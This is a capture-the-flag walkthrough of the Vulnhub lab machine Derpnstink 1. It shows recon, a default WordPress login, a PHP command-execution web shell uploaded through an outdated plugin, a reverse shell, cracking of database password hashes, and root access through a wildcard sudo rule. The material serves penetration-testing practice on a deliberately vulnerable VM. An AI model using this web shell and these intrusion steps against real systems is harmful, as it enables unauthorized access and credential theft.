---
title: DirpNSTink 1 - Vulnhub
image: /assets/img/vuln-dirpnstink/dirpnstink-logo.png
date: 2021-05-01 05:44:00 -1750
categories: [Vulhub]
tags: [linux, wordpress]
show: "Derpnstink 1 was a straight forward machine with some rabbitholes around the machine. It consisted finding hidden wordpress blog with outdated plugin that allows malicious file upload to obtain remote code execution. After obtaining foothold, there is a pcap traffic capture that contains user password. After switching to the user, the user is allowed to run binaries at a specific directory with sudo privilege."
---


[Derpnstink 1](https://www.vulnhub.com/entry/derpnstink-1,221/) was a straight forward machine with some rabbitholes around the machine. It consisted finding hidden wordpress blog with outdated plugin that allows malicious file upload to obtain remote code execution. After obtaining foothold, there is a pcap traffic capture that contains user password. After switching to the user, the user is allowed to run binaries at a specific directory with sudo privilege. 

## Summary
- Leverage outdated wordpress plugin to upload malicious file to obtain remote code execution.
- sudo -l to reveal user is allowed to run some binaries with sudo privilege.


## Nmap results
### Full port scan
Nmap all ports scan showed three ports open.

```bash
┌──(root💀kali)-[~/vuln/derpnstink]
└─# nmap -p0-65535 -oN nmap/derpnstink-allports 10.0.0.141
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-30 22:04 EDT
Nmap scan report for 10.0.0.141
Host is up (0.0018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:6E:8B:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.62 second
```

### Default script scan

Run nmap with default script scan

```bash
┌──(root💀kali)-[~/vuln/derpnstink]
└─# cat nmap/derpnstink     
# Nmap 7.91 scan initiated Fri Apr 30 22:04:10 2021 as: nmap -sC -sV -oN nmap/derpnstink 10.0.0.141
Nmap scan report for 10.0.0.141
Host is up (0.0024s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 00:0C:29:6E:8B:DE (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 30 22:04:18 2021 -- 1 IP address (1 host up) scanned in 8.07 seconds
```

From the above nmap scan output, we have multiple information about the machine like disallowed directories on the server, and that the server is using php as scripting language.

## FTP Service

I tried to login to ftp using anonymous login but unsuccessful. There was no exploit for the ftp version installed as shown below
![](/assets/img/vuln-dirpnstink/20210430221504.png)

## Webserver

The default page was static website.

![](/assets/img/vuln-dirpnstink/20210430221908.png)

Looking at the source code of the static website, there is webnotes directory with a filename info.txt

![](/assets/img/vuln-dirpnstink/20210430222024.png)

The content of the info.txt was as shown below.

![](/assets/img/vuln-dirpnstink/20210430222243.png)

This suggests there might be virtual host routing in play.

![](/assets/img/vuln-dirpnstink/20210430222452.png)

Going one directory up to ```/webnotes```, reveals output of commands run in the server.

![](/assets/img/vuln-dirpnstink/20210430222748.png)

We get two information, username ```stink``` and hostname ```derpnstink.local```. I added the leaked hostname to kali ```/etc/hosts```
The hostname was also serving the same static website.

## Directory bruteforcing

Run gobuster to discover hidden directories.

```bash
┌──(root💀kali)-[~/vuln/derpnstink]
└─# gobuster dir -u http://derpnstink.local/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 -q
/.htpasswd            (Status: 403) [Size: 292]
/.hta                 (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 292]
/css                  (Status: 301) [Size: 317] [--> http://derpnstink.local/css/]
/index.html           (Status: 200) [Size: 1298]                                  
/javascript           (Status: 301) [Size: 324] [--> http://derpnstink.local/javascript/]
/js                   (Status: 301) [Size: 316] [--> http://derpnstink.local/js/]        
/php                  (Status: 301) [Size: 317] [--> http://derpnstink.local/php/]       
/robots.txt           (Status: 200) [Size: 53]                                           
/server-status        (Status: 403) [Size: 296]                                          
/temporary            (Status: 301) [Size: 323] [--> http://derpnstink.local/temporary/] 
/weblog               (Status: 301) [Size: 320] [--> http://derpnstink.local/weblog/] 
```

The directory ```/weblog``` was hosting wordpress blog.

![](/assets/img/vuln-dirpnstink/20210430224256.png)

On the top of the wordpress blog, there is a string ```CaniHazURMoneyPlz``` not sure if it is a password.

Time for wpscan!

### Wordpress

wpscan revealed  admin user.

```bash
┌──(root💀kali)-[~/vuln/derpnstink]
└─# wpscan --url http://derpnstink.local/weblog/ -e
```

As a habit of trying default credentials like admin:admin, I was in with admin:admin.
![](/assets/img/vuln-dirpnstink/20210430231923.png)

The slide-show plugin installed is outdated as shown by wpscan
![](/assets/img/vuln-dirpnstink/20210430232459.png)

I uploaded php script that would take parameter from user and execute system commands on it.

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

After uploading the php script, I browsed to ``` http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php``` to execute the php script and verify rce with ```id``` command.

![](/assets/img/vuln-dirpnstink/20210501121154.png)

## Foothold

There are 2 users in the machine ```stinky, mrderp``` 

![](/assets/img/vuln-dirpnstink/20210501122133.png)

I tried to write ssh key into their ```.ssh/authorized_keys``` but was unsuccessful.

![](/assets/img/vuln-dirpnstink/20210501122835.png)

I set up netcat listener and executed php reverse shell.

![](/assets/img/vuln-dirpnstink/20210501123315.png)

For a proper tty, i executed the following:

```bash
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
</html/weblog/wp-content/uploads/slideshow-gallery$ 

</html/weblog/wp-content/uploads/slideshow-gallery$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                       
┌──(root💀kali)-[~/vuln/derpnstink]
└─# stty raw -echo; fg                                                                                                       148 ⨯ 1 ⚙
[1]  + continued  nc -lnvp 9001

</html/weblog/wp-content/uploads/slideshow-gallery$ 
</html/weblog/wp-content/uploads/slideshow-gallery$ 
</html/weblog/wp-content/uploads/slideshow-gallery$ export TERM=xterm
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$
```

Since wordpress requires database, I started with a hunt for creds to access the MySQL database.

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ cat /var/www/html/weblog/wp-config.php
[snip]
/** The name of the database for WordPress */                                                                                          
define('DB_NAME', 'wordpress');                                                                                                        
                                                                                                                                       
/** MySQL database username */                                     
define('DB_USER', 'root');                                         

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
[snip]
```

I accessed the database using the leaked wordpress credentials from the config file.

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -u root -p
mysql> select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
```

### creds

|user_login|user_pass|
|-----------|----------|
|unclestinky|\$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41|
|admin|\$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/|

## Decrypting wordpress hashes

The hashes from the MySQL database were type ```phpass``` .
In order to crack the hashes with hashcat, the mode for phpass is 400

![](/assets/img/vuln-dirpnstink/20210501125838.png)

Hashcat was taking awhile so i switched over to john.

```bash
┌──(root💀kali)-[~/vuln/derpnstink]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt creds                                                   
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
admin            (admin)
wedgie57         (unclestinky)
2g 0:00:07:53 DONE (2021-05-01 13:10) 0.004228g/s 5911p/s 5953c/s 5953C/s wedguy..wederliy1997
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

The 2 hashes were cracked to:

|user_login|clear text pass|
|----------|---------------|
|admin|admin|
|unclestinky|wedgie57|

The cracked passwords were not valid ssh passwords.

## Local Service (rabbithole)

Port 631 was listening on local port 
```bash
ww-data@DeRPnStiNK:/$ ss -lnpt
State       Recv-Q Send-Q                                   Local Address:Port                                     Peer Address:Port 
LISTEN      0      50                                           127.0.0.1:3306                                                *:*     
LISTEN      0      5                                            127.0.1.1:53                                                  *:*     
LISTEN      0      32                                                   *:21                                                  *:*     
LISTEN      0      128                                                  *:22                                                  *:*     
LISTEN      0      128                                          127.0.0.1:631                                                 *:*     
LISTEN      0      128                                                 :::80                                                 :::*     
LISTEN      0      128                                                 :::22                                                 :::*     
LISTEN      0      128                                                ::1:631                                                :::*     
```

I run curl on it and there was a html page rendered
The footer of the html suggested it was cups running on port 631.

![](/assets/img/vuln-dirpnstink/20210501132218.png)

Since the cracked password didnt led to anywhere it might be the CUPS admin passwords. Therefore, I set up port forwarding using [chisel](https://github.com/jpillora/chisel)
Unfortunately chisel failed to run on the victim machine.

After snooping around the machine for awhile, I realized I skipped critical step after cracking the hashes to try to ```su -``` into the accounts rather than only trying to ssh.

```bash
www-data@DeRPnStiNK:/home$ su - stinky 
Password: [wedgie57]
stinky@DeRPnStiNK:~$ id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
stinky@DeRPnStiNK:~$ 
```

## User Privesc

There was ftp directory in the ```stink``` user directory. In the ftp directory, there is network-logs which contains a text file shown below.

```bash
stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt 
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

The above conversation might suggest there is a network capture file somewhere.
I run ```locate``` and the pcap file was stored in the Desktop

```bash
stinky@DeRPnStiNK:~/ftp/files$ locate *.pcap
/home/stinky/Documents/derpissues.pcap
```

I copied the pcap file to wordpress uploads directory and downloaded it
```bash
stinky@DeRPnStiNK:~/ftp/files$ cp /home/stinky/Documents/derpissues.pcap /var/www/html/weblog/wp-content/uploads/slideshow-gallery/
```

Downloaded the pcap using firefox

![](/assets/img/vuln-dirpnstink/20210501143030.png)

After opening the pcap file using wireshark, i searched for http requests with POST method since high chances are we are looking for password reset as revealed in the text file converstation.

![](/assets/img/vuln-dirpnstink/20210501143846.png)

After following the http stream, one of the streams contained new admin account creation and the password for the account.

![](/assets/img/vuln-dirpnstink/20210501143724.png)

moment of truth! I tried to login to ```mrderp``` account using ```derpderpderpderpderpderpderp```
```bash
stinky@DeRPnStiNK:~$ su - mrderp 
Password: 
mrderp@DeRPnStiNK:~$ 
```
and I was in

![](/assets/img/vuln-dirpnstink/20210501144424.png)

## Root Privesc

user ```mrderp``` can run all binaries stored in ```/home/mrderp/binaries/derpy``` with sudo privilege.

```bash
mrderp@DeRPnStiNK:~$ sudo -l
[sudo] password for mrderp: 
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

The directory /```home/mrderp/binaries ``` did not exist so i created one. The i created file ```derpycmd``` which executes bash. The filename has to start with ```derpy*``` since that is what the user is allowed to run sudo with.

```bash
mrderp@DeRPnStiNK:~/binaries$ pwd
/home/mrderp/binaries
mrderp@DeRPnStiNK:~/binaries$ ls
derpycmd
mrderp@DeRPnStiNK:~/binaries$ cat derpycmd 
#!/bin/bash
bash
```

Finally executing bash with sudo privilege to switch over to root.

```bash
mrderp@DeRPnStiNK:~/binaries$ sudo /home/mrderp/binaries/derpycmd 
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# whoami
root
root@DeRPnStiNK:~/binaries# 
```
